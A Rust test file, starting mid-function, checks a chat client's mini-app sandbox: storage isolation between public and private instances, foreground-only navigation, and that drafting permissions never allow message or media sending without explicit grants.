                host.request("notify.post", {body:if out.is_ok {"escaped"} else {"profile sharing blocked"}})
            })
        })
        Label{text:"fixture"}
    "#);
    let read = matrix_reply(host.process());
    assert!(host.flow.borrow().labels(&context).unwrap().contains(&Source::Account { account: ACCOUNT.into() }));
    assert!(host.flow.borrow().influences(&context).unwrap().contains(&Influence::Unknown));
    host.reply(read, r#"{"user_id":"@owner:test","display_name":"Private profile name"}"#);
    assert!(host.process().into_iter().all(|ask| !matches!(ask, BrokerAsk::Network { .. })));
    assert_eq!(host.notifications(), ["profile sharing blocked"]);
}

#[test]
fn public_fetch_builtin_runs_with_real_vm_and_host_callback() {
    let stock = a2app_core::builtin::stock("public-web").expect("public worker sample is installed");
    let mut cx = Cx::new(Box::new(|_, _| {}));
    cx.with_vm(makepad_widgets::script_mod);
    let errors = makepad_widgets::splash::validate_splash_body_with_host_io(&mut cx, &stock.source);
    assert!(errors.is_empty(), "public worker sample failed strict validation: {errors:?}");
    let host = cx.with_vm(|vm| {
        let value = vm.eval(script! { use mod.widgets.* Splash{} });
        WidgetRef::script_from_value(vm, value)
    });
    makepad_widgets::widget_tree::set_ui_root(&mut cx, &host);
    {
        let mut splash = host.borrow_mut::<Splash>().unwrap();
        splash.set_host_io_only(true);
        splash.set_allow_net(false);
        splash.set_text(&mut cx, &stock.source);
    }
    host.widget(&cx, ids!(status));
    host.widget(&cx, ids!(result));
    assert!(host.borrow_mut::<Splash>().unwrap().call_script_fn(&mut cx, id!(fetch_example), &[]));
    cx.with_vm_and_async(|_| {});
    let requests = makepad_widgets::splash_host::take_splash_host_requests();
    assert_eq!(requests.len(), 1);
    let request = &requests[0];
    assert_eq!(request.service, "network.http");
    assert_eq!(serde_json::from_str::<serde_json::Value>(&request.args_json).unwrap()["url"], "https://example.com/");
    let outcome = makepad_widgets::splash_host::splash_host_respond(&mut cx, request.heap_key, request.req_id,
        Ok(r#"{"status":200,"body":"<h1>Public example</h1>","headers":{}}"#));
    assert_eq!(outcome, makepad_widgets::splash_host::SplashRespondOutcome::Delivered);
    cx.with_vm_and_async(|_| {});
    assert_eq!(host.widget(&cx, ids!(result)).text(), "<h1>Public example</h1>");
    host.set_text(&mut cx, "");
}

#[test]
fn stock_roll_call_posts_dice_without_private_profile_reads_or_action_review() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock("roll-call", false);
    assert!(host.process().is_empty(), "rolling dice must not read the user's private account profile");
    // Prime the widget tree before a script call borrows the Splash. The
    // running UI normally does this during its first draw.
    let dice_label = app.widget(&host.cx, ids!(dice));
    let total_label = app.widget(&host.cx, ids!(total));
    let note_label = app.widget(&host.cx, ids!(note));
    assert!(!dice_label.is_empty() && !total_label.is_empty() && !note_label.is_empty());
    assert!(app.borrow_mut::<Splash>().unwrap().call_script_fn(&mut host.cx, id!(roll), &[]));
    host.cx.with_vm_and_async(|_| {});
    let dice = dice_label.text();
    let total = total_label.text();
    // The dice label shows the faces ("3 + 5"), the total label their sum.
    let faces = dice.split(" + ").map(|face| face.parse::<u32>().unwrap()).collect::<Vec<_>>();
    assert!(faces.len() == 2 && faces.iter().all(|face| (1..=6).contains(face)), "{dice}");
    assert_eq!(total.parse::<u32>().unwrap(), faces[0] + faces[1]);
    assert!(app.borrow_mut::<Splash>().unwrap().call_script_fn(&mut host.cx, id!(post), &[]));
    host.cx.with_vm_and_async(|_| {});
    let (reply, body) = stock_send(host.process());
    assert!(body.starts_with("🎲 Rolled "));
    assert!(body.ends_with(&format!("{dice} = {total}")));
    assert!(host.flow.borrow().labels(&context).unwrap().is_empty());
    assert!(host.flow.borrow().influences(&context).unwrap().is_empty());
    host.reply(reply, "{}");
    host.cx.with_vm_and_async(|_| {});
    assert_eq!(note_label.text(), "Posted to the room!");
}

#[test]
fn stock_public_web_fetches_in_normal_and_public_modes_with_retired_legacy_data() {
    for public in [false, true] {
        let mut host = Harness::new();
        let legacy = host.root.join("app_data").join("public-web");
        std::fs::create_dir_all(&legacy).unwrap();
        std::fs::write(legacy.join("private-cache"), "retained private data").unwrap();
        let (app, context) = host.launch_stock("public-web", public);
        assert!(host.process().is_empty(), "the example fetch requires a user action");
        assert!(app.borrow_mut::<Splash>().unwrap().call_script_fn(&mut host.cx, id!(fetch_example), &[]));
        host.cx.with_vm_and_async(|_| {});
        let (reply, args) = stock_network(host.process());
        assert_eq!(args["url"], "https://example.com/");
        assert!(host.flow.borrow().labels(&context).unwrap().is_empty());
        let jail = host.flow.borrow().context_storage_path(&context).unwrap();
        assert_ne!(jail, legacy);
        assert!(!jail.join("private-cache").exists(), "retired private files stay outside the fresh compartment");
        host.reply(reply, r#"{"status":200,"body":"Public page fixture","headers":{}}"#);
        host.cx.with_vm_and_async(|_| {});
        assert_eq!(app.widget(&host.cx, ids!(result)).text(), "Public page fixture");
        assert!(legacy.join("private-cache").exists(), "the fix retains historical files");
    }
}

#[test]
fn public_and_private_instances_use_distinct_real_storage_jails() {
    let mut host = Harness::new();
    let source = r#"
        fn seed() { fs.write("/retained", "private room data") }
        fn probe() {
            host.request("notify.post", {body:if fs.exists("/retained") {"private file visible"} else {"empty jail"}})
        }
        Label{text:"fixture"}
    "#;
    let (_, private) = host.launch("compartments", false, source);
    host.flow.borrow_mut().add_sources(&private, [Source::Room { account: ACCOUNT.into(), room: ROOM.into() }]).unwrap();
    assert!(host.splashes[0].call_script_fn(&mut host.cx, id!(seed), &[]));
    let (_, public) = host.launch("compartments", true, source);
    assert_ne!(host.flow.borrow().context_storage_path(&public).unwrap(), host.flow.borrow().context_storage_path(&private).unwrap());
    assert!(host.splashes[1].call_script_fn(&mut host.cx, id!(probe), &[]));
    assert_eq!(host.notifications(), ["empty jail"]);
    assert!(host.flow.borrow().labels(&public).unwrap().is_empty());
}

#[test]
fn quota_reports_only_the_requesting_compartments_files() {
    let mut host = Harness::new();
    let source = r#"
        fn seed(text) { fs.write("/retained", text) }
        fn quota() {
            host.request("storage.quota", {}, fn(r) {
                host.request("notify.post", {body:r.data.used.to_json()})
            })
        }
        Label{text:"fixture"}
    "#;
    host.launch("quota", false, source);
    host.launch("quota", true, source);
    assert!(host.splashes[0].call_script_fn_with_strings(&mut host.cx, id!(seed), &["private room secret"]));
    assert!(host.splashes[1].call_script_fn_with_strings(&mut host.cx, id!(seed), &["ok"]));
    assert!(host.splashes[0].call_script_fn(&mut host.cx, id!(quota), &[]));
    assert!(host.splashes[1].call_script_fn(&mut host.cx, id!(quota), &[]));
    let mut results = Vec::new();
    for _ in 0..200 {
        results.extend(host.notifications());
        if results.len() == 2 { break; }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
    results.sort();
    assert_eq!(results, ["19", "2"]);
}


#[test]
fn hidden_instance_cannot_navigate_through_another_foreground_instance_of_the_same_app() {
    let mut host = Harness::new();
    let source = r#"
        fn navigate() {
            host.request("nav.room", {room_id:"!destination:test"}, fn(r) {
                host.request("notify.post", {body:if r.is_ok {"navigation accepted"} else {r.error}})
            })
        }
        Label{text:"fixture"}
    "#;
    let app = "shared-navigation";
    let (hidden, hidden_context) = host.launch(app, false, source);
    let (visible, visible_context) = host.launch_context(app, ContextId::App {
        account: ACCOUNT.into(), app: app.into(), room: Some("!visible:test".into()),
    }, source);
    assert_ne!(hidden, visible);
    assert_ne!(hidden_context, visible_context);
    // This navigation fixture adds a service beyond room-peek's narrowed
    // navigation capabilities; granting its group alone cannot declare it.
    host.apps.get_mut(app).unwrap().capabilities.push("host.nav.room".into());
    // Both app-wide signals claim this app is visible: the modal foreground
    // ID below and Harness::process's is_docked=true. The calling heap wins.
    host.foreground_app = Some(app.into());
    host.panes.insert(hidden, PaneState {
        surface: "parked", side: None, foreground: false, width: 0.0, height: 0.0,
    });
    host.panes.insert(visible, PaneState {
        surface: "modal", side: None, foreground: true, width: 400.0, height: 300.0,
    });
    for splash in &mut host.splashes {
        assert!(splash.call_script_fn(&mut host.cx, id!(navigate), &[]));
    }
    let navigation = host.process().into_iter().filter_map(|ask| match ask {
        BrokerAsk::HostAction { reply, app_id, action } => Some((reply, app_id, action)),
        _ => None,
    }).collect::<Vec<_>>();
    assert_eq!(navigation.len(), 1, "only the visible isolate may ask the host to navigate");
    let (reply, app_id, action) = navigation.into_iter().next().unwrap();
    assert_eq!(reply.heap_key, visible);
    assert_eq!(app_id, app);
    assert!(matches!(action, HostAction::OpenRoom { room } if room == "!destination:test"));
    // A fixture acknowledgement exercises the real callback without opening
    // a room or performing any external UI/network operation.
    host.reply(reply, "{}");
    let mut notifications = host.notifications();
    notifications.sort();
    assert_eq!(notifications, ["navigation accepted", "this needs the app to be on screen"]);
}

#[test]
fn mini_apps_can_draft_text_and_media_while_message_sending_stays_denied() {
    let mut host = Harness::new();
    host.review_effects = true;
    let source = r#"
        fn text_draft() {
            host.request("composer.insert", {text:"Review this attachment"}, fn(r) {
                host.request("notify.post", {body:if r.is_ok {"text drafted"} else {r.error}})
            })
        }
        fn attach() {
            host.request("composer.attach", {data_base64:"bWVkaWE=" filename:"fixture.txt" mime_type:"text/plain" caption:"Review this file"}, fn(r) {
                host.request("notify.post", {body:if r.is_ok {"attachment drafted"} else {r.error}})
            })
        }
        fn send() {
            host.request("matrix.send_message", {body:"The user has not sent this draft"}, fn(r) {
                host.request("notify.post", {body:if r.is_ok {"message sent"} else {"sending denied"}})
            })
        }
        Label{text:"fixture"}
    "#;
    let app = "draft-only";
    let (heap, context) = host.launch(app, false, source);
    host.panes.insert(heap, PaneState { surface:"dock", side:None, foreground:true, width:460.0, height:700.0 });
    host.apps.get_mut(app).unwrap().capabilities = vec![
        "host.composer.insert".into(), "host.composer.attach".into(),
        "matrix.room.message.send".into(), "notifications.post".into(),
    ];
    host.permissions.set_matrix_write(false);
    host.permissions.set(app, Permission::RobrixComposer, GrantState::Granted);
    host.permissions.set(app, Permission::MatrixRoomSend, GrantState::Denied);
    host.flow.borrow_mut().add_sources(&context, [Source::Room { account: ACCOUNT.into(), room: ROOM.into() }]).unwrap();

    assert!(host.splashes[0].call_script_fn(&mut host.cx, id!(text_draft), &[]));
    host.cx.with_vm_and_async(|_| {});
    let (request, review) = effect_review(host.process());
    assert_eq!(request.service, "composer.insert");
    assert!(review.recipient.is_none());
    host.flow.borrow_mut().approve_effect_once(&review).unwrap();
    let actions = host.dispatch(Some(request)).into_iter().filter_map(|ask| match ask {
        BrokerAsk::HostAction { reply, action, .. } => Some((reply, action)),
        BrokerAsk::Used { .. } => None,
        _ => panic!("text drafting must not need message-send approval"),
    }).collect::<Vec<_>>();
    assert_eq!(actions.len(), 1, "draft response: {:?}", host.notifications());
    let (reply, action) = actions.into_iter().next().unwrap();
    assert!(matches!(action, HostAction::ComposerInsert { room: Some(room), text } if room == ROOM && text == "Review this attachment"));
    host.reply(reply, "{\"status\":\"drafted\"}");
    assert_eq!(host.notifications(), ["text drafted"]);

    assert!(host.splashes[0].call_script_fn(&mut host.cx, id!(attach), &[]));
    host.cx.with_vm_and_async(|_| {});
    let (request, review) = effect_review(host.process());
    assert_eq!(request.service, "composer.attach");
    assert!(review.recipient.is_none());
    host.flow.borrow_mut().approve_effect_once(&review).unwrap();
    let actions = host.dispatch(Some(request)).into_iter().filter_map(|ask| match ask {
        BrokerAsk::HostAction { reply, action, .. } => Some((reply, action)),
        BrokerAsk::Used { .. } => None,
        _ => panic!("attachment drafting must not need upload, send or remote-sharing approval"),
    }).collect::<Vec<_>>();
    assert_eq!(actions.len(), 1);
    let (reply, action) = actions.into_iter().next().unwrap();
    let HostAction::ComposerAttach { room, data_base64, filename, mime_type, caption } = action else { panic!("expected native attachment staging") };
    assert_eq!(room.as_deref(), Some(ROOM));
    assert_eq!(data_base64, "bWVkaWE=");
    assert_eq!(filename, "fixture.txt");
    assert_eq!(mime_type, "text/plain");
    assert_eq!(caption.as_deref(), Some("Review this file"));
    host.reply(reply, "{\"status\":\"drafted\"}");
    assert_eq!(host.notifications(), ["attachment drafted"]);

    assert!(host.splashes[0].call_script_fn(&mut host.cx, id!(send), &[]));
    host.cx.with_vm_and_async(|_| {});
    let asks = host.process();
    assert!(!asks.iter().any(|ask| matches!(ask, BrokerAsk::Matrix { .. } | BrokerAsk::EnableWrites { .. })),
        "a draft permission must never authorize a Matrix send or offer to bypass the denial");
    assert_eq!(host.notifications(), ["sending denied"]);
    assert!(!host.permissions.matrix_write());
}

#[test]
fn stock_room_peek_prepares_text_and_picked_media_with_posting_denied() {
    fn draft_action(host: &mut Harness, app: &WidgetRef) -> (Reply, HostAction) {
        let mut asks = host.process();
        if asks.iter().any(|ask| matches!(ask, BrokerAsk::FlowReview { .. })) {
            let (request, review) = effect_review(asks);
            assert!(review.recipient.is_none(), "local drafting must not request a remote sharing grant");
            assert!(matches!(request.service.as_str(), "composer.insert" | "composer.attach"));
            host.flow.borrow_mut().approve_effect_once(&review).unwrap();
            asks = host.dispatch(Some(request));
        }
        let mut action = None;
        for ask in asks {
            match ask {
                BrokerAsk::HostAction { reply, action: item, .. } => assert!(action.replace((reply, item)).is_none()),
                BrokerAsk::Used { .. } => {},
                _ => panic!("a stock draft must not request uploading, posting, or enabling writes"),
            }
        }
        action.unwrap_or_else(|| panic!("stock draft reaches the native composer: {}", app.widget(&host.cx, ids!(send_note)).text()))
    }

    let mut host = Harness::new();
    let (app, context) = host.launch_stock("room-peek", false);
    host.permissions.set_matrix_write(false);
    host.permissions.set("room-peek", Permission::MatrixRoomSend, GrantState::Denied);
    host.permissions.set("room-peek", Permission::MatrixMedia, GrantState::Denied);
    host.boot();
    host.settle_stock(&app, "room-peek", &mut StockAudit::default());
    // The fixture compresses boot reads and several UI clicks into one turn;
    // isolate the user-action budget instead of sleeping for its refill.
    host.broker.forget_app("room-peek");
    app.text_input(&host.cx, ids!(msg_input)).set_text(&mut host.cx, "Prepare this for review");
    assert!(host.call(&app, "draft_msg", &[]));
    let (reply, action) = draft_action(&mut host, &app);
    assert!(matches!(action, HostAction::ComposerInsert { room:Some(room), text } if room == ROOM && text == "Prepare this for review"));
    host.reply(reply, "{\"status\":\"drafted\"}");
    host.cx.with_vm_and_async(|_| {});
    assert_eq!(app.widget(&host.cx, ids!(send_note)).text(), "Draft ready. Review and send it in Robrix.");

    // Fixture only the already-authorized picker callback: no OS dialog or
    // device path is exposed, while the real stock script stages the bytes.
    for result in [r#"{"cancelled":true}"#, r#"{"name":"notes.txt","size":5,"text":"media","data_base64":"bWVkaWE=","mime_type":"text/plain"}"#] {
        app.text_input(&host.cx, ids!(msg_input)).set_text(&mut host.cx, "Attachment caption");
        assert!(host.call(&app, "attach_file", &[]));
        let requests = makepad_widgets::splash_host::take_splash_host_requests();
        assert_eq!(requests.len(), 1);
        let request = &requests[0];
        assert_eq!(request.service, "files.pick");
        let cap = a2app_core::capabilities::for_service("files.pick").unwrap();
        assert_eq!(host.permissions.effective_capability_in_context(host.apps.get("room-peek").unwrap(), cap,
            services::permission_context("files.pick", &serde_json::Value::Null, context.room())), Effective::Granted);
        host.flow.borrow_mut().add_sources(&context, [Source::Account { account:ACCOUNT.into() }]).unwrap();
        host.flow.borrow_mut().add_influences(&context, [Influence::Unknown]).unwrap();
        host.reply(Reply { heap_key:request.heap_key, req_id:request.req_id }, result);
        host.cx.with_vm_and_async(|_| {});
        if result.contains("cancelled") {
            assert_eq!(app.widget(&host.cx, ids!(send_note)).text(), "No attachment selected.");
            assert!(host.process().is_empty(), "canceling a picker must not stage or post content");
        } else {
            let (reply, action) = draft_action(&mut host, &app);
            assert!(matches!(action, HostAction::ComposerAttach { room:Some(room), filename, data_base64, mime_type, caption:Some(caption) }
                if room == ROOM && filename == "notes.txt" && data_base64 == "bWVkaWE=" && mime_type == "text/plain" && caption == "Attachment caption"));
            host.reply(reply, "{\"status\":\"drafted\"}");
            host.cx.with_vm_and_async(|_| {});
            assert_eq!(app.widget(&host.cx, ids!(send_note)).text(), "Attachment ready. Review and send it in Robrix.");
        }
    }
    app.text_input(&host.cx, ids!(msg_input)).set_text(&mut host.cx, "Keep this local");
    assert!(host.call(&app, "send_msg", &[]));
    assert!(!host.process().iter().any(|ask| matches!(ask, BrokerAsk::Matrix { .. } | BrokerAsk::EnableWrites { .. })),
        "composer consent must not authorize the stock Send now action");
    assert!(!host.permissions.matrix_write());
}

#[test]
fn stock_room_peek_sends_picked_media_only_from_its_explicit_send_control() {
    fn answer_picker(host: &mut Harness, context: &ContextId, result: &str) {
        let requests = makepad_widgets::splash_host::take_splash_host_requests();
        assert_eq!(requests.len(), 1);
        let request = &requests[0];
        assert_eq!(request.service, "files.pick", "each direct send first asks the user to select its file");
        let cap = a2app_core::capabilities::for_service("files.pick").unwrap();
        assert_eq!(host.permissions.effective_capability_in_context(host.apps.get("room-peek").unwrap(), cap,
            services::permission_context("files.pick", &serde_json::Value::Null, context.room())), Effective::Granted);
        host.flow.borrow_mut().add_sources(context, [Source::Account { account:ACCOUNT.into() }]).unwrap();
        host.flow.borrow_mut().add_influences(context, [Influence::Unknown]).unwrap();
        host.reply(Reply { heap_key:request.heap_key, req_id:request.req_id }, result);
        host.cx.with_vm_and_async(|_| {});
    }

    let mut host = Harness::new();
    let (app, context) = host.launch_stock("room-peek", false);
    assert!(host.process().is_empty());
    app.text_input(&host.cx, ids!(msg_input)).set_text(&mut host.cx, "This caption belongs to the selected file");
    assert!(host.call(&app, "send_file_now", &[]));
    answer_picker(&mut host, &context, r#"{"cancelled":true}"#);
    assert_eq!(app.widget(&host.cx, ids!(send_note)).text(), "No file sent.");
    assert!(host.process().is_empty(), "canceling a picker must not stage, upload or post");
    let file = r#"{"name":"notes.txt","size":5,"text":"media","data_base64":"bWVkaWE=","mime_type":"text/plain"}"#;

    host.permissions.set("room-peek", Permission::MatrixMedia, GrantState::Denied);
    assert!(host.call(&app, "send_file_now", &[]));
    answer_picker(&mut host, &context, file);
    assert!(!host.process().iter().any(|ask| matches!(ask, BrokerAsk::Matrix { .. } | BrokerAsk::HostAction { .. } | BrokerAsk::EnableWrites { .. })),
        "a refused file send must not post or fall back to staging");
    assert_eq!(app.text_input(&host.cx, ids!(msg_input)).text(), "This caption belongs to the selected file");
    assert!(!app.widget(&host.cx, ids!(send_note)).text().is_empty());

    host.permissions.set("room-peek", Permission::MatrixMedia, GrantState::Granted);
    host.permissions.set_capability("room-peek", "matrix.media.upload", GrantState::Denied);
    assert!(host.call(&app, "send_file_now", &[]));
    answer_picker(&mut host, &context, file);
    assert!(!host.process().iter().any(|ask| matches!(ask, BrokerAsk::Matrix { .. } | BrokerAsk::HostAction { .. } | BrokerAsk::EnableWrites { .. })),
        "a media-send grant must not bypass an explicit upload denial");

    host.permissions.set_capability("room-peek", "matrix.media.upload", GrantState::Granted);
    host.permissions.set("room-peek", Permission::RobrixComposer, GrantState::Denied);
    host.broker.forget_app("room-peek");
    assert!(host.call(&app, "send_file_now", &[]));
    answer_picker(&mut host, &context, file);
    let (request, review) = effect_review(host.process());
    assert_eq!(request.service, "matrix.send_media");
    assert_eq!(review.recipient, Some(Recipient::MatrixRoom { account:ACCOUNT.into(), room:ROOM.into() }));
    assert_eq!(review.action.as_ref().unwrap().kind, "matrix.media.send");
    host.flow.borrow_mut().approve_effect_once(&review).unwrap();
    let mut posted = None;
    for ask in host.dispatch(Some(request)) {
        match ask {
            BrokerAsk::Matrix { reply, room, capability, consent, call:services::MatrixServiceCall::SendMedia { data_base64, filename, mime_type, caption }, .. } => {
                assert_eq!(room.as_deref(), Some(ROOM));
                assert_eq!(capability, "matrix.media.send");
                assert_eq!(filename, "notes.txt");
                assert_eq!(data_base64, "bWVkaWE=");
                assert_eq!(mime_type, "text/plain");
                assert_eq!(caption.as_deref(), Some("This caption belongs to the selected file"));
                assert_eq!(consent.capability_state("room-peek", "matrix.media.upload"), GrantState::Granted);
                assert!(posted.replace(reply).is_none());
            },
            BrokerAsk::Used { .. } => {},
            _ => panic!("the explicit direct send reaches only the native media worker"),
        }
    }
    host.reply(posted.expect("explicit file send dispatches exactly once"), r#"{"room_id":"!private:test","event_id":"$media:test"}"#);
    host.cx.with_vm_and_async(|_| {});
    assert_eq!(app.widget(&host.cx, ids!(send_note)).text(), "File sent!");
    assert_eq!(app.text_input(&host.cx, ids!(msg_input)).text(), "");
}

#[test]
fn stock_room_peek_names_senders_by_display_name_with_a_localpart_fallback() {
    fn has_text(widget: &WidgetRef, text: &str) -> bool {
        if widget.text() == text { return true; }
        let mut children = Vec::new();
        widget.children(&mut |_, child| children.push(child));
        children.iter().any(|child| has_text(child, text))
    }
    let mut host = Harness::new();
    let (app, _) = host.launch_stock("room-peek", false);
    // Current hosts add each row's room display name; older hosts send only the localpart.
    host.queue_matrix_reply("matrix.room.messages.read", serde_json::json!({"messages": [
        {"event_id": "$named:test", "room_id": ROOM, "sender": "priya", "sender_id": "@priya:test", "sender_name": "Priya Shah",
            "body": "named row", "ts": 1720000000000_u64, "msgtype": "m.text"},
        {"event_id": "$plain:test", "room_id": ROOM, "sender": "diego", "sender_id": "@diego:test",
            "body": "plain row", "ts": 1720000060000_u64, "msgtype": "m.text"},
    ]}));
    host.boot();
    host.settle_stock(&app, "room-peek", &mut StockAudit::default());
    for text in ["named row", "Priya Shah", "P", "plain row", "diego", "D"] {
        assert!(has_text(&app, text), "room peek's message list shows {text:?}");
    }
    assert!(!has_text(&app, "priya"), "a display name replaces the localpart");
}

#[test]
fn stock_room_peek_without_a_room_explains_itself_instead_of_offering_its_composer() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock("room-peek", false);
    host.boot();
    // Every room read fails the way the host refuses a pane opened without a room.
    let mut pending = VecDeque::from(host.process());
    for _ in 0..20 {
        while let Some(ask) = pending.pop_front() {
            match ask {
                BrokerAsk::Matrix { reply, .. } => {
                    host.guest_work(reply.heap_key, |cx| services::respond(cx, reply, Err("this mini-app is not attached to a room")));
                    host.cx.with_vm_and_async(|_| {});
                    host.assert_callback_errors("room-peek");
                }
                BrokerAsk::FlowReview { request, review } => {
                    host.flow.borrow_mut().approve_effect_session(&review, SharingDuration::RobrixSession).unwrap();
                    pending.extend(host.dispatch(Some(request)));
                }
                BrokerAsk::Subscribe { reply, .. } => host.reply(reply, r#"{"subscribed":true}"#),
                BrokerAsk::Used { .. } => {},
                _ => panic!("unexpected room peek request without a room"),
            }
        }
        pending.extend(host.process());
        if pending.is_empty() { break; }
    }
    assert!(app.widget(&host.cx, ids!(no_room_wrap)).visible(), "the no-room card explains what to do");
    assert!(!app.widget(&host.cx, ids!(head_row)).visible(), "the header doesn't show the host's raw refusal");
    assert!(!app.widget(&host.cx, ids!(compose_wrap)).visible(), "drafting and sending need a room");
    assert!(visible_control(&app, "Send now").is_none());
}

#[test]
fn stock_roll_call_drafts_results_while_direct_posting_is_denied() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock("roll-call", false);
    host.permissions.set_matrix_write(false);
    host.permissions.set("roll-call", Permission::MatrixRoomSend, GrantState::Denied);
    assert!(host.call(&app, "draft_result", &[]));
    let mut result = None;
    for ask in host.process() {
        match ask {
            BrokerAsk::HostAction { reply, action:HostAction::ComposerInsert { room, text }, .. } => {
                assert_eq!(room.as_deref(), Some(ROOM));
                assert_eq!(text, "🎲 Rolled 1 + 1 = 2");
                assert!(result.replace(reply).is_none());
            },
            BrokerAsk::Used { .. } => {},
            _ => panic!("dice drafting must not ask to enable posting"),
        }
    }
    host.reply(result.expect("dice result reaches composer"), "{\"status\":\"drafted\"}");
    host.cx.with_vm_and_async(|_| {});
    assert_eq!(app.widget(&host.cx, ids!(note)).text(), "Draft ready. Review and send it in Robrix.");
    assert!(host.call(&app, "post", &[]));
    assert!(!host.process().iter().any(|ask| matches!(ask, BrokerAsk::Matrix { .. } | BrokerAsk::EnableWrites { .. })));
    assert!(!host.permissions.matrix_write());
}

#[test]
fn stock_watcher_drafts_leave_fetching_watching_and_automatic_sending_denied() {
    for app_id in ["website-watch", "simple-watcher", "watcher"] {
        let mut host = Harness::new();
        let (app, _) = host.launch_stock(app_id, false);
        host.permissions.set_matrix_write(false);
        for permission in [Permission::MatrixRoomSend, Permission::MatrixRoomWatch, Permission::Network, Permission::Notifications] {
            host.permissions.set(app_id, permission, GrantState::Denied);
        }
        assert!(host.process().is_empty(), "{app_id} waits for user startup or action");
        if app_id == "website-watch" {
            assert!(host.call(&app, "on_app_resize", &[460_u32.into(), 700_u32.into()]));
            assert!(host.process().is_empty());
            assert!(host.call(&app, "draft_report", &[]));
        } else {
            assert!(host.call_strings(&app, "draft_reply", &["  Please review this reply  "]));
        }
        let mut reply = None;
        for ask in host.process() {
            match ask {
                BrokerAsk::HostAction { reply:callback, action:HostAction::ComposerInsert { room, text }, .. } => {
                    assert_eq!(room.as_deref(), Some(ROOM));
                    if app_id == "website-watch" {
                        assert_eq!(text, "Website Watch test for 'Example Domain' at https://example.com/");
                    } else { assert_eq!(text, "Please review this reply"); }
                    assert!(reply.replace(callback).is_none());
                },
                BrokerAsk::Used { perm:Permission::RobrixComposer, .. } => {},
                _ => panic!("{app_id} drafting must not fetch, subscribe, test rules, or enable automatic sending"),
            }
        }
        host.reply(reply.expect("stock watcher draft reaches the composer"), "{\"status\":\"drafted\"}");
        host.cx.with_vm_and_async(|_| {});
        let expected = if app_id == "website-watch" {
            "Test report drafted. Review and send it in Robrix. The website was not checked."
        } else { "Reply drafted. Review and send it in Robrix." };
        assert_eq!(app.widget(&host.cx, ids!(status)).text(), expected);
        assert!(host.process().is_empty(), "draft completion must not enqueue automatic work");
        assert!(!host.permissions.matrix_write());
        for permission in [Permission::MatrixRoomSend, Permission::MatrixRoomWatch, Permission::Network, Permission::Notifications] {
            assert_eq!(host.permissions.state(app_id, permission), GrantState::Denied);
        }
    }
}
